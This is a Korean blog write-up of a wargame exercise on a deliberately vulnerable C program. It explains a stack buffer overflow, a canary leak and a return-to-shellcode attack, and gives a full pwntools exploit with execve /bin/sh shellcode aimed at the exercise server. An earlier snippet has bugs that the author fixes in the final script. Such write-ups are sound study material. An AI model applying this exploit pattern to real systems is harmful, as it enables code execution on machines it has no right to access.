---
layout: post
title: "Return to Shellcode"
categories: [SWING, Writeup]
tags: [Exploit, Shellcode, Buffer Overflow, Canary]
last_modified_at: 2024-01-28
---

Exploit Tech: Return to Shellcode

```c
// Name: r2s.c
// Compile: gcc -o r2s r2s.c -zexecstack

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}
```

#### 보호기법 탐지
적용된 보호기법 파악 -> checksec 툴 사용  
RELRO, Canary, NX, PIE 파악 가능  

![Checksec Output](https://blog.kakaocdn.net/dna/IJyfE/btsD4sjeJ7U/AAAAAAAAAAAAAAAAAAAAABoORbi2UGGp_t6BoVylHPnLgF0jACMXZ9Q9PT2qUCgu/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=hW5GVAdrQYwYRjgD9NWiAEh444s%3D)

#### 취약점 탐색
**1. buf의 주소**  
```c
  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);
```
buf 주소와 buf, rbp 사이 거리 알려줌  

**2. 스택 버퍼 오버플로우**  
```c
  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);
```
두 곳에서 오버플로우 발생  

#### 익스플로잇 시나리오
1. 카나리 우회  
read함수에서 카나리 출력시키기  
2. 셸 획득  
gets함수에서 쉘코드 작성하고 반환 주소 덮기  

#### 익스플로잇
**1. 스택 프레임 정보 수집**  
```python
# name: r2s.py 
from pwn import *

p=remote('host3',port)

def slog(n, m): return success(': '.join([n, hex(m)]))
context.arch = 'amd64'

# buf 주소 출력 
p.recvuntil(b'buf: ')
buf=int(p.recvline()[:-1],16) 
slog('Address of buf', buf)

# buf와 sfp 거리 출력 
p.recvuntil(b'$rbp: ')
bufrbp=int(p.recvline().split()[0]) 
slog('buf <=> sfp', bufrbp)

# buf와 canary 거리 출력 
bufcanary=bufrbp-8
slog('buf <=> canary', bufcanary)
```
모르는 파이썬 문법은 접은 글로 정리  

1. success와 join  
success: 통신 성공 시 호출하는 함수  
join: 리스트 요소를 하나로 합쳐줌  
': '.join([0,1]) 이면 0: 1  

2. context.arch 설정 이유  
아키텍처 설정, amd64 x86-64, i386 x86, arm arm  

3. [:-1]  
[ 이상 : 미만 ]  
본 코드에 나온 [:-1]은 마지막 데이터 제외 모든 데이터  

**2. 카나리 릭**  
```python
# 카나리 값 노출 
payload=b'A'*(bufcanary+1) #nullbyte까지 덮어주기 

p.sendafter(b'Input:', payload)
p.recvuntil(payload)
cnry = u64(b'\x00'+p.recvn(7))
slog('Canary', cnry)
```

**3. 익스플로잇**  
```python
shellcode=b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
payload2=shellcode+b'A'*(0x58-0x23)+p64(cnry)+b'B'*0x8+p64(buf) 
p.sendlineafter(b'Input:', payload)

p.interactive()
```

**4. 풀 익스플로잇**  
```python
# name: r2s.py
from pwn import *

p=remote('host3.dreamhack.games',10520)

def slog(n, m): return success(': '.join([n, hex(m)]))
context.arch = 'amd64'

# buf 주소 출력
p.recvuntil(b'buf: ')
buf=int(p.recvline()[:-1],16)
slog('Address of buf', buf)

# buf와 sfp 거리 출력
p.recvuntil(b'$rbp: ')
bufrbp=int(p.recvline().split()[0])
slog('buf <=> sfp', bufrbp)

# buf와 canary 거리 출력
bufcanary=bufrbp-8
slog('buf <=> canary', bufcanary)

# 카나리 값 노출
payload=b'A'*(bufcanary+1) #nullbyte까지 덮어주기

p.sendafter(b'Input:', payload)
p.recvuntil(payload)
cnry = u64(b'\x00'+p.recvn(7))
slog('Canary', cnry)

shellcode=b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
payload2=shellcode+b'A'*(0x58-len(shellcode))+p64(cnry)+b'B'*0x8+p64(buf)
p.sendlineafter(b'Input:', payload2)

p.interactive()
```
실행하면서 조금 더 바꿨는데 일단 slog에 변수 잘못 작성한 거 고쳐줬고  
1. payload2로 send(payload라고 잘못썼더라)  
2. shellcode 23바이트래서 0x58-0x23해줬는데 자꾸 안되길래 len(shellcode)로 바꿔주었다  

![Exploit Result](https://blog.kakaocdn.net/dna/5269i/btsD3dHkmTm/AAAAAAAAAAAAAAAAAAAAAJuHBRmMN7eoULkl7CqF9jaKCjwpEABirTqETNhvKIQw/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=cLNbbvp0tDaI2M1p7r8IhVEVBVk%3D)